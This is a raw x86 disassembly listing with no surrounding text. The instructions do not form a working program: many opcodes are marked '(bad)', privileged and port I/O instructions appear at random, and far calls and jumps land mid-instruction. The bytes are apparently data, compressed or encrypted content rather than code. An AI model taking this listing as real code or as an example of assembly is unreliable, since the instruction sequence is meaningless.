  42e0a0:	adc    BYTE PTR [edx+0x26],0x0
  42e0a4:	out    dx,al
  42e0a5:	xchg   edx,eax
  42e0a6:	add    al,0x9b
  42e0a8:	mov    al,ds:0x90777a18
  42e0ad:	call   0x2eae:0xb4ccd5eb
  42e0b4:	and    eax,0xe010f8ea
  42e0b9:	call   0x16c0:0x694d795e
  42e0c0:	jb     0x42e0f2
  42e0c2:	sar    edx,cl
  42e0c4:	repnz xchg esp,eax
  42e0c6:	sub    al,0x61
  42e0c8:	aam    0x33
  42e0ca:	mov    BYTE PTR [edx],bh
  42e0cc:	sub    bl,BYTE PTR [eax]
  42e0ce:	ins    BYTE PTR es:[edi],dx
  42e0cf:	imul   esp,ecx,0xae9a5818
  42e0d5:	push   0x74
  42e0d7:	imul   BYTE PTR [esp+edi*4]
  42e0da:	mov    ds:0xa0d6dc49,eax
  42e0df:	test   al,0xfd
  42e0e1:	add    BYTE PTR [bp+di-0x13d7],cl
  42e0e6:	mov    dl,0x56
  42e0e8:	sub    DWORD PTR cs:[edx-0x47],0x40
  42e0ed:	mov    esp,0x306892e1
  42e0f2:	dec    ebp
  42e0f3:	movups xmm4,XMMWORD PTR [edi]
  42e0f6:	shr    esi,cl
  42e0f8:	xor    eax,0xe2a622c
  42e0fd:	inc    ebp
  42e0fe:	lods   al,BYTE PTR ds:[esi]
  42e0ff:	xor    al,0xa5
  42e101:	fst    DWORD PTR [eax]
  42e103:	and    BYTE PTR [edx],cl
  42e105:	push   esp
  42e106:	cwde   
  42e107:	loopne 0x42e113
  42e109:	sub    ebp,DWORD PTR [esi]
  42e10b:	inc    eax
  42e10c:	push   esp
  42e10d:	fs jo  0x42e0c4
  42e110:	xor    BYTE PTR [esp+esi*4],dl
  42e113:	inc    ebx
  42e114:	jae    0x42e12e
  42e116:	loop   0x42e190
  42e118:	sub    BYTE PTR [eax],0xb2
  42e11b:	sub    bh,BYTE PTR [edx+0x22]
  42e11e:	test   al,0x35
  42e120:	push   esp
  42e121:	out    dx,al
  42e122:	adc    eax,0xf8ee9e92
  42e127:	shl    dl,0xdb
  42e12a:	cli    
  42e12b:	mov    al,ds:0xb0800e39
  42e130:	inc    eax
  42e131:	pusha  
  42e132:	ss mov bl,0x0
  42e135:	or     bl,BYTE PTR [edx+eiz*1]
  42e138:	arpl   WORD PTR [ecx+0x158cc9e8],si
  42e13e:	push   ebp
  42e13f:	pop    ss
  42e140:	add    BYTE PTR [edx+0x6c],ch
  42e143:	sbb    BYTE PTR [ecx],al
  42e145:	jl     0x42e19e
  42e147:	sti    
  42e148:	ins    BYTE PTR es:[edi],dx
  42e149:	xor    al,0x13
  42e14b:	push   esi
  42e14c:	retf   0x2efa
  42e14f:	retf   
  42e150:	or     ah,BYTE PTR [eax-0x60]
  42e153:	mov    ecx,0x2404d408
  42e158:	lods   eax,DWORD PTR ds:[esi]
  42e159:	retf   0xc00c
  42e15c:	ret    0x1298
  42e15f:	or     eax,0xd058ec94
  42e164:	push   eax
  42e165:	push   0x40
  42e167:	jecxz  0x42e0ec
  42e169:	add    eax,0x26a71360
  42e16e:	mov    al,ds:0xea2080
  42e173:	stos   BYTE PTR es:[edi],al
  42e174:	xor    bl,BYTE PTR [edi-0x1f]
  42e177:	add    al,0x7c
  42e179:	shl    BYTE PTR [esi],cl
  42e17b:	add    BYTE PTR [ebx+0x4c3e8aac],ch
  42e181:	push   esp
  42e182:	lods   eax,DWORD PTR ds:[esi]
  42e183:	sub    BYTE PTR [edx-0x5c],ah
  42e186:	hlt    
  42e187:	or     al,dl
  42e189:	jb     0x42e1c5
  42e18b:	shl    DWORD PTR [edi],0x9
  42e18e:	(bad)  
  42e18f:	cmp    al,0x80
  42e191:	(bad)  
  42e192:	fiadd  DWORD PTR [edx+edi*4+0x59e0b51e]
  42e199:	inc    esp
  42e19a:	sub    DWORD PTR [esi+0x15ef967e],esi
  42e1a0:	dec    edx
  42e1a1:	(bad)  
  42e1a3:	mov    cl,0x1c
  42e1a5:	loope  0x42e202
  42e1a7:	mov    bh,0xf0
  42e1a9:	iret   
  42e1aa:	outs   dx,DWORD PTR ds:[esi]
  42e1ab:	push   0x4d
  42e1ad:	cmc    
  42e1ae:	jb     0x42e1cf
  42e1b0:	xchg   BYTE PTR [esi-0x78],cl
  42e1b3:	add    al,0xac
  42e1b5:	cmp    edi,DWORD PTR [esi+0x7a0034db]
  42e1bb:	sbb    eax,0x8135a906
  42e1c0:	sub    bh,ch
  42e1c2:	aam    0x24
  42e1c4:	mov    ecx,fs
  42e1c6:	xor    eax,0xb3240585
  42e1cb:	clc    
  42e1cc:	and    dh,BYTE PTR [ecx+eiz*2+0xfa2c003]
  42e1d3:	lods   al,BYTE PTR ds:[esi]
  42e1d4:	xchg   ebp,eax
  42e1d5:	and    BYTE PTR [esi+0x4e],cl
  42e1d8:	add    DWORD PTR [edx+0x8],eax
  42e1db:	loop   0x42e1bb
  42e1dd:	ss mov al,0x85
  42e1e0:	ror    BYTE PTR [ecx-0x40],1
  42e1e3:	mov    al,ds:0x141af5da
  42e1e8:	sbb    BYTE PTR [ecx],0xc0
  42e1eb:	test   BYTE PTR [esi+0xc],dl
  42e1ee:	inc    edx
  42e1ef:	or     ecx,DWORD PTR [edx+0x560c5c1a]
  42e1f5:	sub    al,0x9c
  42e1f7:	iret   
  42e1f8:	inc    ebp
  42e1f9:	ss xor al,0x54
  42e1fc:	jl     0x42e21e
  42e1fe:	mov    ch,0x9a
  42e200:	mov    ebx,0xf2feb86e
  42e205:	inc    esp
  42e206:	dec    DWORD PTR [edx-0x167bed31]
  42e20c:	sub    eax,0xa1009cac
  42e211:	pop    esi
  42e212:	add    bl,al
  42e214:	rol    BYTE PTR [eax],1
  42e216:	rcr    DWORD PTR [esi],0x52
  42e219:	fwait
  42e21a:	(bad)  
  42e21b:	ja     0x42e1a0
  42e21d:	rcr    BYTE PTR [esi+0x254beec],cl
  42e223:	push   esi
  42e224:	inc    ecx
  42e225:	push   ss
  42e226:	mov    dl,0x6a
  42e228:	sbb    al,0xf1
  42e22a:	ins    DWORD PTR es:[edi],dx
  42e22b:	jae    0x42e228
  42e22d:	add    DWORD PTR [ecx+edx*1],edx
  42e230:	jle    0x42e1de
  42e232:	aas    
  42e233:	add    BYTE PTR [eax-0x655f11f3],ch
  42e239:	fwait
  42e23a:	mov    cl,BYTE PTR [eax*1+0x5ce680c0]
  42e241:	sbb    dl,bh
  42e243:	jnp    0x42e1f2
  42e245:	mov    ds:0xe261110e,al
  42e24a:	xchg   edx,eax
  42e24b:	scas   al,BYTE PTR es:[edi]
  42e24c:	or     dl,bl
  42e24e:	mov    bh,0xb5
  42e250:	test   eax,0xb8a43280
  42e255:	xor    BYTE PTR [edx-0x2e7fe47e],bl
  42e25b:	cli    
  42e25c:	cdq    
  42e25d:	add    al,0x0
  42e25f:	push   ecx
  42e260:	hlt    
  42e261:	shl    ebp,1
  42e263:	and    al,0xa0
  42e265:	sub    bh,dh
  42e267:	cld    
  42e268:	outs   dx,BYTE PTR ds:[esi]
  42e269:	es scas al,BYTE PTR es:[edi]
  42e26b:	lds    esi,FWORD PTR [ecx]
  42e26d:	jbe    0x42e2c9
  42e26f:	add    al,0xc9
  42e271:	xor    eax,0x28677765
  42e276:	into   
  42e277:	cmp    BYTE PTR [eax+0x4b],0x9b
  42e27b:	outs   dx,BYTE PTR ds:[esi]
  42e27c:	aad    0xee
  42e27e:	sti    
  42e27f:	jmp    0x5576d8
  42e284:	int    0x36
  42e286:	sbb    dl,BYTE PTR [esi+edx*8-0x22]
  42e28a:	jo     0x42e220
  42e28c:	sub    al,0x40
  42e28e:	bound  ebp,QWORD PTR [esi+ebp*1-0x2c151fec]
  42e295:	es and eax,0xdc9c5c50
  42e29b:	(bad)  
  42e29c:	out    0xcc,eax
  42e29e:	pop    esi
  42e29f:	mov    ch,ch
  42e2a1:	leave  
  42e2a2:	inc    esp
  42e2a3:	ret    0x8932
  42e2a6:	les    ebx,FWORD PTR [ebx-0x24a6e235]
  42e2ac:	pop    es
  42e2ad:	call   0x45fb29a7
  42e2b2:	mov    ch,BYTE PTR [esi+ecx*1-0x779e32ed]
  42e2b9:	retf   0xb884
  42e2bc:	push   edx
  42e2bd:	sbb    cl,0x68
  42e2c0:	(bad)  
  42e2c1:	out    0xac,al
  42e2c3:	pop    eax
  42e2c4:	sbb    DWORD PTR [ebp-0x6a],eax
  42e2c7:	mov    dl,0xcc
  42e2c9:	in     al,0xf2
  42e2cb:	mov    dl,0x16
  42e2cd:	adc    al,0x59
  42e2cf:	fmul   QWORD PTR [eax+0x72]
  42e2d2:	mov    edx,0x5b60b780
  42e2d7:	jnp    0x42e2e1
  42e2d9:	sub    DWORD PTR [esp+edi*1+0x2e],edi
  42e2dd:	or     bl,BYTE PTR [esi+0x6a]
  42e2e0:	cmp    dh,BYTE PTR [eax+ecx*4+0xa]
  42e2e4:	and    al,0x18
  42e2e6:	into   
  42e2e7:	mov    WORD PTR [esi+0x2d],fs
  42e2ea:	retf   0xcab4
  42e2ed:	dec    esp
  42e2ee:	into   
  42e2ef:	sub    al,BYTE PTR [eax-0x2bafb956]
  42e2f5:	mov    ah,0xa2
  42e2f7:	(bad)  
  42e2f8:	iret   
  42e2f9:	push   edx
  42e2fa:	inc    ebp
  42e2fb:	push   esp
  42e2fd:	adc    al,0x20
  42e2ff:	(bad)  
  42e300:	mov    eax,ds:0x822638d0
  42e305:	inc    ebx
  42e306:	test   BYTE PTR [esi-0x7fbb4425],bh
  42e30c:	into   
  42e30d:	jo     0x42e32f
  42e30f:	and    bl,BYTE PTR [eax+eax*1-0x49]
  42e313:	hlt    
  42e314:	es stos BYTE PTR es:[edi],al
  42e316:	inc    edx
  42e317:	mov    al,ds:0x4e6e59e3
  42e31c:	xor    BYTE PTR [edx-0x22],al
  42e31f:	(bad)  
  42e321:	and    cl,BYTE PTR [edx]
  42e323:	inc    BYTE PTR [eax-0x7c]
  42e326:	stos   DWORD PTR es:[edi],eax
  42e327:	test   BYTE PTR [eax],cl
  42e329:	xchg   edi,eax
  42e32a:	les    ecx,FWORD PTR [esi-0x25d33f4a]
  42e330:	fimul  DWORD PTR [esi+0x72039a1b]
  42e336:	shl    BYTE PTR [edx-0x4043a7c6],1
  42e33c:	test   eax,0x1d1103b4
  42e341:	xchg   esi,eax
  42e342:	or     dl,BYTE PTR [edx+ecx*2+0x34]
  42e346:	mov    DWORD PTR [ecx-0x75ea5f56],esi
  42e34c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42e34d:	cli    
  42e34e:	test   eax,0xd1a26e42
  42e353:	add    DWORD PTR [ebp+0x2a26b4c3],0x6ca606f2
  42e35d:	mov    al,ds:0x8667404a
  42e362:	sub    BYTE PTR [eax+0x58],0x51
  42e366:	jne    0x42e39e
  42e368:	arpl   si,bx
  42e36a:	mov    BYTE PTR [esi-0x32d37176],cl
  42e370:	mov    DWORD PTR [eax],ecx
  42e372:	cmp    al,0x3
  42e374:	sub    al,0xa5
  42e376:	int3   
  42e377:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42e378:	add    eax,0x2b9aa8b6
  42e37d:	push   eax
  42e37e:	xchg   DWORD PTR [ebp+0x22],ebp
  42e381:	push   es
  42e382:	or     dl,BYTE PTR cs:[eax+0x50]
  42e386:	ror    DWORD PTR [esi],1
  42e388:	test   ch,dh
  42e38a:	mov    BYTE PTR [edx+ecx*8+0x68],ah
  42e38e:	cld    
  42e38f:	call   0x946b1a4e
  42e394:	enter  0x3724,0x69
  42e398:	or     edx,ebx
  42e39a:	fadd   QWORD PTR [ecx]
  42e39c:	add    eax,0xd084aad6
  42e3a1:	sbb    BYTE PTR [esi+0x10],0xf6
  42e3a5:	inc    edx
  42e3a6:	inc    ebp
  42e3a7:	mov    ds:0x907c4a8e,al
  42e3ac:	jb     0x42e3c0
  42e3ae:	push   eax
  42e3af:	mov    esp,0xed85ad0
  42e3b4:	lods   al,BYTE PTR ds:[esi]
  42e3b5:	in     eax,dx
  42e3b6:	jl     0x42e35c
  42e3b8:	jo     0x42e3dd
  42e3ba:	xchg   edx,eax
  42e3bb:	push   esi
  42e3bc:	adc    al,0xa
  42e3be:	lock sub al,0x63
  42e3c1:	data16 or bl,BYTE PTR ds:0x2c4d70a2
  42e3c8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42e3c9:	ds push ss
  42e3cb:	xor    ebp,eax
  42e3cd:	dec    esi
  42e3ce:	inc    ecx
  42e3cf:	pop    eax
  42e3d0:	aad    0x50
  42e3d2:	nop
  42e3d3:	jg     0x42e397
  42e3d5:	adc    BYTE PTR [ebp+eax*8+0x228fb3db],dh
  42e3dc:	pop    esi
  42e3dd:	into   
  42e3de:	cmp    al,0x1
  42e3e0:	adc    dh,BYTE PTR [ecx]
  42e3e2:	(bad)  
  42e3e3:	mov    cs,WORD PTR [eax+0x62a163c2]
  42e3e9:	addr16 fcomip st,st(4)
  42e3ec:	in     al,0xfa
  42e3ee:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42e3ef:	cwde   
  42e3f0:	push   0x381bf14d
  42e3f5:	out    dx,eax
  42e3f6:	(bad)  
  42e3f7:	jo     0x42e439
  42e3f9:	mov    ebp,0x87eff5e
  42e3fe:	ins    DWORD PTR es:[edi],dx
  42e3ff:	stos   DWORD PTR es:[edi],eax
  42e400:	cs ja  0x42e419
  42e403:	and    BYTE PTR [esi],ch
  42e405:	mov    eax,0xd38388b2
  42e40a:	mov    bh,0x89
  42e40c:	cs retf 
  42e40e:	push   edx
  42e40f:	adc    bl,BYTE PTR [edi+0x6a]
  42e412:	or     bh,BYTE PTR [edx]
  42e414:	inc    esp
  42e415:	aam    0x7f
  42e417:	lods   al,BYTE PTR ds:[esi]
  42e418:	ins    BYTE PTR es:[edi],dx
  42e419:	fs and al,0x44
  42e41c:	push   cs
  42e41d:	fistp  DWORD PTR [edx]
  42e41f:	mov    edx,0x43ece762
  42e424:	hlt    
  42e425:	inc    ebp
  42e426:	xchg   ebx,eax
  42e427:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42e428:	neg    al
  42e42a:	shl    BYTE PTR [edx+0x33085c86],0x26
  42e431:	stc    
  42e432:	xchg   edi,eax
  42e433:	stos   BYTE PTR es:[edi],al
  42e434:	test   eax,0xfdbae1a2
  42e439:	mov    esp,0xeed270ce
  42e43e:	mov    ds:0x625d0a0a,eax
  42e443:	push   eax
  42e444:	mov    dh,0x73
  42e446:	mov    dl,0x3d
  42e448:	pop    ebx
  42e449:	aas    
  42e44a:	sbb    ecx,0xc6e1bbba
  42e450:	mov    bh,0xa2
  42e452:	mov    ds:0x682a44c1,al
  42e457:	popf   
  42e458:	and    al,bl
  42e45a:	ds inc esp
  42e45c:	mov    ah,0x66
  42e45e:	inc    esp
  42e45f:	call   0xd813:0x413615fa
  42e466:	push   eax
  42e467:	aam    0x88
  42e469:	adc    cl,dh
  42e46b:	jmp    0x42e411
  42e46d:	jecxz  0x42e429
  42e46f:	sbb    ah,BYTE PTR [ebx+eax*1-0xd2270c]
  42e476:	jmp    0xd685:0x5504c02
  42e47d:	mov    dl,0xf4
  42e47f:	cmp    bl,cl
  42e481:	lods   al,BYTE PTR ds:[esi]
  42e482:	out    dx,eax
  42e483:	mov    ds:0x125f0588,eax
  42e488:	push   es
  42e489:	pop    edx
  42e48a:	xchg   edx,eax
  42e48b:	cld    
  42e48c:	dec    esi
  42e48d:	adc    al,BYTE PTR es:[ebx]
  42e490:	jmp    0xd8a2eccd
  42e495:	xchg   ebp,eax
  42e496:	stc    
  42e497:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42e498:	xchg   BYTE PTR [ecx],al
  42e49a:	je     0x42e489
  42e49c:	sub    BYTE PTR [eax+eax*8],ch
  42e49f:	add    BYTE PTR [esi+0x620bc6ef],al
  42e4a5:	inc    edi
  42e4a6:	inc    ebx
  42e4a7:	cld    
  42e4a8:	sbb    al,BYTE PTR [ebx]
  42e4aa:	dec    eax
  42e4ab:	in     al,0x28
  42e4ad:	inc    eax
  42e4ae:	push   ecx
  42e4af:	or     BYTE PTR [edx-0x17cdcd5e],0xa0
  42e4b6:	lea    esi,[eax+0x5b]
  42e4b9:	or     BYTE PTR [ecx+eax*8+0x58],bh
  42e4bd:	or     ch,BYTE PTR [edi+0x1626daf7]
  42e4c3:	push   esp
  42e4c4:	adc    al,0x39
  42e4c6:	(bad)
  42e4ca:	cs ss out dx,al
  42e4cd:	or     al,BYTE PTR [edx+0x78161782]
  42e4d3:	pop    ebx
  42e4d4:	jl     0x42e554
  42e4d6:	cmp    al,0x72
  42e4d8:	adc    al,0xb5
  42e4da:	es loopne 0x42e47d
  42e4dd:	add    BYTE PTR [edi+0x72],bl
  42e4e0:	add    eax,0xeb926bbe
  42e4e5:	mov    ebx,0xc14683e
  42e4ea:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42e4eb:	mov    BYTE PTR [eax+edi*8],dl
  42e4ee:	mov    eax,ds:0x4fd9566e
  42e4f3:	or     esi,ecx
  42e4f5:	inc    ebx
  42e4f6:	popf   
  42e4f7:	push   0x48
  42e4f9:	fdiv   st,st(5)
  42e4fb:	cmp    eax,0x5a92b443
  42e500:	add    al,0x54
  42e502:	popa   
  42e503:	fdivr  DWORD PTR [ebp+ebx*8+0xd24a64]
  42e50a:	jno    0x42e522
  42e50c:	fidiv  DWORD PTR [ecx]
  42e50e:	add    al,bh
  42e510:	inc    eax
  42e511:	fidiv  DWORD PTR [esi+0x5459c08b]
  42e517:	push   esp
  42e518:	cmp    BYTE PTR [ebp+0x58],0x86
  42e51c:	add    eax,0x15ec5d45
  42e521:	ret    0xa8d1
  42e524:	call   0x80ae:0x1a92ce4c
  42e52b:	dec    eax
  42e52c:	(bad)  
  42e52d:	repnz cwde 
  42e52f:	jne    0x42e58b
  42e531:	mov    al,ds:0x14f225d8
  42e536:	add    DWORD PTR [ecx+0x16],0x54
  42e53a:	pop    ecx
  42e53b:	or     eax,DWORD PTR [ebx+0x45]
  42e53e:	loope  0x42e581
  42e540:	bound  edi,QWORD PTR ds:0xa00682cc
  42e546:	mov    eax,ds:0xdee6c648
  42e54b:	jl     0x42e543
  42e54d:	pop    edx
  42e54e:	mov    edi,0x5a1d4d80
  42e553:	fnstenv [esi-0x9]
  42e556:	fwait
  42e557:	or     cl,BYTE PTR [ecx]
  42e559:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42e55a:	adc    eax,0xc45b789b
  42e55f:	cmp    dh,BYTE PTR [edi-0x36]
  42e562:	or     DWORD PTR [esp+esi*1],edx
  42e565:	sub    al,0x3c
  42e568:	ins    BYTE PTR es:[edi],dx
  42e569:	nop
  42e56a:	test   eax,0x1ea2a6a9
  42e56f:	in     eax,dx
  42e570:	mov    al,ds:0x76b47913
  42e575:	xor    eax,0x4ae83415
  42e57a:	int3   
  42e57b:	mov    ah,BYTE PTR [eax-0x3e9c3d3f]
  42e581:	js     0x42e5a5
  42e583:	jbe    0x42e58e
  42e585:	xchg   esi,eax
  42e586:	xor    ah,BYTE PTR [edx]
  42e588:	mov    cs,WORD PTR [edx]
  42e58a:	xlat   BYTE PTR ds:[ebx]
  42e58b:	and    al,0xda
  42e58d:	(bad)  
  42e58f:	dec    bl
  42e591:	add    bl,BYTE PTR [edx-0x7683ab0f]
  42e597:	test   DWORD PTR [ecx],edx
  42e599:	lea    ecx,[edi]
  42e59b:	jbe    0x42e5a7
  42e59d:	sub    edi,DWORD PTR [esi+0x35]
  42e5a0:	sbb    BYTE PTR [eax+0x1],bh
  42e5a3:	scas   al,BYTE PTR es:[edi]
  42e5a4:	loopne 0x42e562
  42e5a6:	add    ah,bl
  42e5a8:	xchg   ch,dl
  42e5aa:	rol    BYTE PTR [edx+edx*1+0x31888e9a],1
  42e5b1:	adc    BYTE PTR es:[eax+0x21],0xe8
  42e5b6:	add    cl,dl
  42e5b8:	repnz lods al,BYTE PTR es:[esi]
  42e5bb:	and    DWORD PTR [esi-0x5e],ecx
  42e5be:	aaa    
  42e5bf:	pop    eax
  42e5c0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42e5c1:	xchg   esi,eax
  42e5c2:	ror    DWORD PTR [edx],cl
  42e5c4:	je     0x42e5f2
  42e5c6:	jp     0x42e5c8
  42e5c8:	nop
  42e5c9:	mov    esp,0xd55815b0
  42e5ce:	das    
  42e5cf:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42e5d0:	xor    BYTE PTR [edx],bh
  42e5d2:	xchg   esp,eax
  42e5d3:	ins    BYTE PTR es:[edi],dx
  42e5d4:	je     0x42e5e0
  42e5d6:	xor    DWORD PTR [ebp-0x7e],esp
  42e5d9:	adc    bh,BYTE PTR [edx+eax*1-0x24]
  42e5dd:	cdq    
  42e5de:	hlt    
  42e5df:	mov    edx,0xbc003e9b
  42e5e4:	test   BYTE PTR [edx+0x0],dh
  42e5e7:	inc    esi
  42e5e8:	outs   dx,BYTE PTR ds:[esi]
  42e5e9:	push   es
  42e5ea:	add    esi,DWORD PTR [esi-0x3b]
  42e5ed:	ins    DWORD PTR es:[edi],dx
  42e5ee:	ret    
  42e5ef:	jle    0x42e5bc
  42e5f1:	push   0x380e245e
  42e5f6:	inc    esp
  42e5f7:	inc    esi
  42e5f8:	add    eax,0xc244c2ad
  42e5fd:	pop    eax
  42e5fe:	mov    bl,0xb2
  42e600:	mov    ebp,0x92ee8942
  42e605:	mov    DWORD PTR [eax+eax*1],eax
  42e608:	inc    edx
  42e609:	inc    esi
  42e60a:	cwde   
  42e60b:	sbb    DWORD PTR [eax],eax
  42e60d:	shl    DWORD PTR [eax+0x20],cl
  42e610:	pusha  
  42e611:	add    DWORD PTR [eax],ebp
  42e613:	jbe    0x42e68b
  42e615:	sbb    ah,dl
  42e617:	or     DWORD PTR [eax+0x64],ebx
  42e61a:	xchg   BYTE PTR [ebx-0x40eb6f4a],bl
  42e620:	sub    al,0x6c
  42e622:	mov    dh,0x6a
  42e624:	out    0xe5,al
  42e626:	dec    esp
  42e627:	fs loope 0x42e680
  42e62a:	cli    
  42e62b:	jno    0x42e676
  42e62d:	int    0xac
  42e62f:	dec    ebx
  42e630:	adc    ebp,DWORD PTR [edx]
  42e632:	fist   WORD PTR [edx+0x6899b276]
  42e638:	push   0x68
  42e63a:	push   edx
  42e63b:	xor    DWORD PTR [esi-0x5541a77a],eax
  42e641:	fimul  DWORD PTR [edi]
  42e643:	mov    al,ds:0xf1f856e6
  42e648:	data16 or dl,dh
  42e64b:	mov    cl,BYTE PTR [esi]
  42e64d:	mov    dl,0x6e
  42e64f:	mov    eax,ds:0x43c2ec0
  42e654:	pop    esi
  42e655:	pop    ds
  42e656:	mov    al,ds:0x28ec241e
  42e65b:	sub    al,0x23
  42e65d:	cld    
  42e65e:	mov    al,ds:0x681f646
  42e663:	fisttp DWORD PTR [esp+esi*1+0x74]
  42e667:	adc    BYTE PTR [eax-0x5f794754],al
  42e66d:	loope  0x42e641
  42e66f:	shl    ch,0x77
  42e672:	repnz add eax,0xc4c9aad4
  42e678:	xor    eax,0x4026d2b4
  42e67d:	inc    esp
  42e67e:	nop
  42e67f:	xlat   BYTE PTR ds:[ebx]
  42e680:	push   ss
  42e681:	pop    esi
  42e682:	mov    ds:0x88ecfe9e,eax
  42e687:	std    
  42e688:	mov    ah,0xe5
  42e68a:	sub    ch,BYTE PTR [ebx+ebp*2+0x4d]
  42e68e:	mov    BYTE PTR [edx+0x3a],dl
  42e691:	add    DWORD PTR [edx-0x58ff45f],eax
  42e697:	xor    BYTE PTR ds:0xd8a6a15b,dh
  42e69d:	retf   0x4b9d
  42e6a0:	out    dx,al
  42e6a1:	sbb    cl,0xa8
  42e6a4:	dec    ecx
  42e6a5:	push   eax
  42e6a6:	add    DWORD PTR [esi+0x60],ebp
  42e6a9:	or     al,0x46
  42e6ab:	call   0xa9f4aa51
  42e6b0:	adc    al,0xa3
  42e6b2:	mov    es,WORD PTR [esi]
  42e6b4:	and    eax,0xa0d43054
  42e6b9:	mov    al,ds:0x2ec2b1c3
  42e6be:	push   ecx
  42e6bf:	and    al,0x66
  42e6c1:	into   
  42e6c2:	ins    BYTE PTR es:[edi],dx
  42e6c3:	dec    edx
  42e6c4:	mov    ah,0xa
  42e6c6:	test   al,0xa8
  42e6c8:	cmp    al,0xb3
  42e6ca:	ret    0xd4e1
  42e6cd:	xchg   ebp,eax
  42e6ce:	sbb    al,0x41
  42e6d0:	loope  0x42e72a
  42e6d2:	ret    0x7063
  42e6d5:	(bad)  
  42e6d7:	mov    esi,0x4ab08696
  42e6dc:	sub    BYTE PTR [edx-0x55c4a76a],ch
  42e6e2:	sub    BYTE PTR [edx-0x3fd1fdd0],dh
  42e6e8:	jbe    0x42e69a
  42e6ea:	(bad)
  42e6ed:	push   0xb0d4c2e2
  42e6f2:	sbb    al,BYTE PTR [eax]
  42e6f4:	sahf   
  42e6f5:	lea    eax,[eax]
  42e6f7:	das    
  42e6f8:	and    DWORD PTR [esi-0x4aeb89ae],edx
  42e6fe:	add    dh,BYTE PTR [eax]
  42e700:	jg     0x42e68a
  42e702:	ret    
  42e703:	clc    
  42e704:	or     BYTE PTR [edx-0x1b34d3a0],0x38
  42e70b:	and    BYTE PTR [esi-0x1f],ah
  42e70e:	and    al,0x7e
  42e710:	mov    edi,cs
  42e712:	aam    0x7
  42e714:	test   al,0xce
  42e716:	enter  0xd282,0x6f
  42e71a:	pop    edx
  42e71b:	xor    eax,0xc860389
  42e720:	cmp    BYTE PTR [ebx+esi*1-0x64ff5cb5],ch
  42e727:	cmp    al,dh
  42e729:	mov    ds:0xa23a5e7c,eax
  42e72e:	mov    al,BYTE PTR [edx]
  42e730:	ret    
  42e731:	stc    
  42e732:	cmp    eax,0xa6bc6656
  42e737:	fcom   DWORD PTR [edx-0x32efe1ff]
  42e73d:	test   eax,0xf030db16
  42e742:	imul   edx,DWORD PTR [edx-0x36],0xe2355404
  42e749:	push   ebp
  42e74a:	ficom  WORD PTR [edx+0x18]
  42e74d:	mov    ds:0x30a1a8aa,al
  42e752:	xor    BYTE PTR [edi+eiz*4-0x62],al
  42e756:	xor    al,0x90
  42e758:	pop    ecx
  42e759:	test   BYTE PTR [edx+0x15],ch
  42e75c:	mov    dh,0x64
  42e75e:	mov    ds,WORD PTR [ebx-0x72]
  42e761:	push   ss
  42e762:	jmp    0x42e716
  42e764:	in     al,0x58
  42e766:	mov    ebx,0xd62a0a1a
  42e76b:	stos   DWORD PTR es:[edi],eax
  42e76c:	ins    BYTE PTR es:[edi],dx
  42e76d:	cmp    edi,eax
  42e76f:	clc    
  42e770:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42e771:	inc    edx
  42e772:	adc    dl,ah
  42e774:	rcr    eax,cl
  42e776:	popa   
  42e777:	inc    esi
  42e778:	dec    eax
  42e779:	data16 jb 0x42e7b8
  42e77c:	aam    0xc8
  42e77e:	aam    0x68
  42e780:	mov    al,ds:0x993cbab8
  42e785:	or     dl,BYTE PTR [eax+0x20e98144]
  42e78b:	leave  
  42e78c:	push   0x54
  42e78e:	sbb    al,0x6b
  42e790:	adc    ebx,0xffffff82
  42e793:	mov    ds:0x3ef5c260,al
  42e798:	shl    DWORD PTR [ecx+0x7d4e0978],1
  42e79e:	add    edx,eax
  42e7a0:	push   ds
  42e7a1:	mov    al,BYTE PTR [esi-0x7dab5cfa]
  42e7a7:	frstor [esp+esi*2]
  42e7aa:	and    edx,DWORD PTR [eax-0x10]
  42e7ad:	dec    ecx
  42e7ae:	pop    ebp
  42e7af:	fst    DWORD PTR [esi+eiz*8]
  42e7b2:	and    cl,BYTE PTR [eax-0x5f]
  42e7b5:	jb     0x42e74c
  42e7b7:	and    dl,BYTE PTR [ebx]
  42e7b9:	push   eax
  42e7ba:	push   eax
  42e7bb:	int3   
  42e7bc:	lods   eax,DWORD PTR ds:[esi]
  42e7bd:	pushf  
  42e7be:	js     0x42e774
  42e7c0:	ds jecxz 0x42e7d6
  42e7c3:	(bad)  
  42e7c4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42e7c5:	pop    ebx
  42e7c6:	mov    dl,0xf9
  42e7c8:	ret    0x9bbe
  42e7cb:	dec    ecx
  42e7cc:	loopne 0x42e803
  42e7ce:	mov    ah,0x54
  42e7d0:	ins    BYTE PTR es:[edi],dx
  42e7d1:	int    0xbc
  42e7d3:	sbb    ah,ah
  42e7d5:	fsub   DWORD PTR [eax+0x3967058]
  42e7db:	xchg   esi,eax
  42e7dc:	retf   
  42e7dd:	xor    BYTE PTR [esi],dl
  42e7df:	loopne 0x42e7ae
  42e7e1:	jo     0x42e834
  42e7e3:	pusha  
  42e7e4:	fbld   TBYTE PTR [esp+eax*1+0xb5e2ac]
  42e7eb:	dec    ecx
  42e7ec:	xchg   edx,eax
  42e7ed:	call   0x50b0:0x2517b49c
  42e7f4:	mov    al,ds:0x3594e656
  42e7f9:	std    
  42e7fa:	ret    
  42e7fb:	inc    edx
  42e7fc:	or     BYTE PTR [eax],ah
  42e7fe:	mov    dl,0x84
  42e800:	add    BYTE PTR ds:0x29143fd6,ah
  42e806:	gs push esp
  42e808:	xor    bl,ch
  42e80a:	lods   al,BYTE PTR ds:[esi]
  42e80b:	mov    al,0x74
  42e80d:	push   esi
  42e80e:	cmp    al,0x92
  42e810:	fsubr  DWORD PTR [esi+0x30]
  42e813:	sbb    ch,ah
  42e815:	inc    eax
  42e816:	out    dx,al
  42e817:	in     al,0x51
  42e819:	inc    ecx
  42e81a:	mov    ebx,0x64c47696
  42e81f:	les    ebx,FWORD PTR [eax]
  42e821:	pop    ss
